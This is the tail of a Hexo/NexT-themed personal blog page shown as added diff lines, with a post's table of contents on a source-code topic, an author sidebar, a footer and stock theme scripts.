+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%9C%B0%E5%9D%80-amp-amp-%E4%B8%80%E4%BA%9B%E4%BA%A4%E4%BB%A3"><span class="nav-text">源码地址&amp;&amp;一些交代</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%A5%E6%89%8B%E6%BA%90%E7%A0%81"><span class="nav-text">入手源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E6%9D%9F%E8%AF%AD"><span class="nav-text">结束语</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Geez"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Geez</p>
+  <div class="site-description" itemprop="description">黑客,诗人,养龟仔</div>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/geeeez/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;geeeez&#x2F;" rel="noopener" target="_blank"><i class="fa fa-fw fa-fab fa-github"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-fas fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Geez</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">118k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:47</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+  
+
+    </div>
+</body>
+</html>
